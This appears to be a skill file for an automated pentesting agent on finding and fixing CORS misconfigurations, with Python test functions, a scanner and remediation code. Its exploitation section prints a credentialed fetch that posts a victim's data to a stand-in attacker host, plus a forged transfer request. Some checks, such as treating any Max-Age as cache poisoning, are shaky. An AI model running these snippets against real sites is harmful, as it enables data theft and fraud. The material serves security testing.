---
name: cors_testing
description: Cross-Origin Resource Sharing (CORS) misconfiguration testing and exploitation
---

# CORS Testing

## Overview
CORS misconfigurations can allow unauthorized cross-origin access to sensitive resources. Testing must cover origin validation, credential handling, and header manipulation.

## Testing Methodology

### 1. Origin Validation Testing

#### Reflect Any Origin
```python
async def test_reflect_origin(session, endpoint):
    """Test if server reflects any origin"""
    origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://subdomain.evil.com",
        "https://evil.com.example.com",
    ]
    
    results = []
    for origin in origins:
        headers = {"Origin": origin}
        response = await session.get(endpoint, headers=headers)
        
        acao = response.headers.get("Access-Control-Allow-Origin")
        acac = response.headers.get("Access-Control-Allow-Credentials")
        
        if acao == origin:
            results.append({
                "origin": origin,
                "reflected": True,
                "credentials": acac == "true"
            })
    
    return results
```

#### Null Origin
```python
async def test_null_origin(session, endpoint):
    """Test if null origin is allowed"""
    headers = {"Origin": "null"}
    response = await session.get(endpoint, headers=headers)
    
    acao = response.headers.get("Access-Control-Allow-Origin")
    return acao == "null"
```

### 2. Credential Testing

#### Credentials with Wildcard
```python
async def test_credentials_wildcard(session, endpoint):
    """Test if credentials work with wildcard origin"""
    headers = {"Origin": "https://evil.com"}
    response = await session.get(endpoint, headers=headers)
    
    acao = response.headers.get("Access-Control-Allow-Origin")
    acac = response.headers.get("Access-Control-Allow-Credentials")
    
    # Credentials cannot be used with wildcard
    if acao == "*" and acac == "true":
        return {"vulnerable": True, "issue": "Credentials with wildcard"}
    
    return {"vulnerable": False}
```

#### Pre-Flight with Credentials
```python
async def test_preflight_credentials(session, endpoint):
    """Test preflight request with credentials"""
    headers = {
        "Origin": "https://evil.com",
        "Access-Control-Request-Method": "DELETE",
        "Access-Control-Request-Headers": "Authorization"
    }
    
    response = await session.options(endpoint, headers=headers)
    
    acam = response.headers.get("Access-Control-Allow-Methods")
    acah = response.headers.get("Access-Control-Allow-Headers")
    acac = response.headers.get("Access-Control-Allow-Credentials")
    
    if acac == "true" and ("DELETE" in acam or "*" in acam):
        return {"vulnerable": True}
    
    return {"vulnerable": False}
```

### 3. Subdomain Trust Testing

#### Trusted Subdomains
```python
async def test_subdomain_trust(session, endpoint, base_domain):
    """Test if subdomains are trusted"""
    subdomains = [
        f"evil.{base_domain}",
        f"attacker.{base_domain}",
        f"test.evil.{base_domain}",
    ]
    
    results = []
    for subdomain in subdomains:
        headers = {"Origin": f"https://{subdomain}"}
        response = await session.get(endpoint, headers=headers)
        
        acao = response.headers.get("Access-Control-Allow-Origin")
        if acao:
            results.append({
                "subdomain": subdomain,
                "allowed": True,
                "origin_reflected": acao == f"https://{subdomain}"
            })
    
    return results
```

### 4. Method & Header Testing

#### Allowed Methods
```python
async def test_allowed_methods(session, endpoint):
    """Test which methods are allowed cross-origin"""
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
    
    results = []
    for method in methods:
        headers = {
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": method
        }
        
        response = await session.options(endpoint, headers=headers)
        acam = response.headers.get("Access-Control-Allow-Methods", "")
        
        if method in acam or "*" in acam:
            results.append({"method": method, "allowed": True})
    
    return results
```

#### Allowed Headers
```python
async def test_allowed_headers(session, endpoint):
    """Test which headers are allowed cross-origin"""
    headers_to_test = [
        "Authorization",
        "Content-Type",
        "X-Requested-With",
        "X-Custom-Header",
        "Cookie"
    ]
    
    results = []
    for header in headers_to_test:
        request_headers = {
            "Origin": "https://evil.com",
            "Access-Control-Request-Headers": header
        }
        
        response = await session.options(endpoint, headers=request_headers)
        acah = response.headers.get("Access-Control-Allow-Headers", "")
        
        if header in acah or "*" in acah:
            results.append({"header": header, "allowed": True})
    
    return results
```

### 5. Pre-Flight Caching

#### Cache Poisoning
```python
async def test_preflight_cache_poisoning(session, endpoint):
    """Test if preflight cache can be poisoned"""
    # Send malicious preflight
    headers = {
        "Origin": "https://evil.com",
        "Access-Control-Request-Method": "DELETE",
        "Access-Control-Request-Headers": "Authorization"
    }
    
    response1 = await session.options(endpoint, headers=headers)
    max_age = response1.headers.get("Access-Control-Max-Age")
    
    # Check if response is cached
    if max_age and int(max_age) > 0:
        return {
            "vulnerable": True,
            "max_age": max_age,
            "cache_duration": f"{int(max_age)} seconds"
        }
    
    return {"vulnerable": False}
```

### 6. Exploitation Scenarios

#### Data Exfiltration
```javascript
// Malicious page that exfiltrates data via CORS
fetch('https://vulnerable.com/api/user', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    // Send data to attacker
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

#### Action Hijacking
```javascript
// Malicious page that performs actions as victim
fetch('https://vulnerable.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker',
        amount: 1000
    })
});
```

### 7. Tools & Scripts

#### CORS Scanner
```python
#!/usr/bin/env python3
"""CORS misconfiguration scanner"""
import asyncio
import aiohttp
from typing import Dict, List, Any

class CORSScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings: List[Dict[str, Any]] = []
    
    async def test_origin_reflection(self, session: aiohttp.ClientSession, endpoint: str):
        """Test if any origin is reflected"""
        evil_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null"
        ]
        
        for origin in evil_origins:
            headers = {"Origin": origin}
            async with session.get(f"{self.base_url}{endpoint}", headers=headers) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin")
                acac = resp.headers.get("Access-Control-Allow-Credentials")
                
                if acao == origin:
                    self.findings.append({
                        "type": "ORIGIN_REFLECTION",
                        "severity": "HIGH" if acac == "true" else "MEDIUM",
                        "description": f"Origin '{origin}' reflected",
                        "credentials": acac == "true"
                    })
                    return True
        return False
    
    async def test_null_origin(self, session: aiohttp.ClientSession, endpoint: str):
        """Test if null origin is allowed"""
        headers = {"Origin": "null"}
        async with session.get(f"{self.base_url}{endpoint}", headers=headers) as resp:
            acao = resp.headers.get("Access-Control-Allow-Origin")
            
            if acao == "null":
                self.findings.append({
                    "type": "NULL_ORIGIN_ALLOWED",
                    "severity": "HIGH",
                    "description": "Null origin allowed"
                })
                return True
        return False
    
    async def test_wildcard_credentials(self, session: aiohttp.ClientSession, endpoint: str):
        """Test if wildcard origin works with credentials"""
        headers = {"Origin": "https://evil.com"}
        async with session.get(f"{self.base_url}{endpoint}", headers=headers) as resp:
            acao = resp.headers.get("Access-Control-Allow-Origin")
            acac = resp.headers.get("Access-Control-Allow-Credentials")
            
            if acao == "*" and acac == "true":
                self.findings.append({
                    "type": "WILDCARD_WITH_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Wildcard origin with credentials enabled"
                })
                return True
        return False
    
    async def run_all_tests(self, endpoints: List[str]) -> List[Dict[str, Any]]:
        """Run all CORS tests"""
        print("Starting CORS scan...")
        
        async with aiohttp.ClientSession() as session:
            for endpoint in endpoints:
                print(f"Testing {endpoint}...")
                await self.test_origin_reflection(session, endpoint)
                await self.test_null_origin(session, endpoint)
                await self.test_wildcard_credentials(session, endpoint)
        
        print(f"\nScan complete. Found {len(self.findings)} issues.")
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return self.findings

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python cors_scanner.py <base_url>")
        sys.exit(1)
    
    scanner = CORSScanner(sys.argv[1])
    asyncio.run(scanner.run_all_tests(["/api/user", "/api/data"]))
```

### 8. Remediation Guidance

#### Proper Origin Validation
```python
# BAD: Reflect any origin
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin

# GOOD: Validate against whitelist
ALLOWED_ORIGINS = ['https://example.com', 'https://app.example.com']

origin = request.headers.get('Origin')
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
```

#### Credentials Configuration
```python
# Only allow credentials with specific origins
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
else:
    # Don't set credentials header
    pass
```

#### Restrictive Headers
```python
# Only allow necessary methods and headers
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
```

#### Subdomain Validation
```python
import re

def is_trusted_subdomain(origin: str, trusted_domain: str) -> bool:
    """Validate that origin is a trusted subdomain"""
    pattern = rf'^https://[a-z0-9-]+\.{re.escape(trusted_domain)}$'
    return bool(re.match(pattern, origin))
```

## Validation Checklist

- [ ] Origins validated against whitelist
- [ ] Null origin not allowed
- [ ] Wildcard not used with credentials
- [ ] Only necessary methods allowed
- [ ] Only necessary headers allowed
- [ ] Pre-flight cache duration reasonable
- [ ] Subdomains validated properly
- [ ] No sensitive data exposed cross-origin
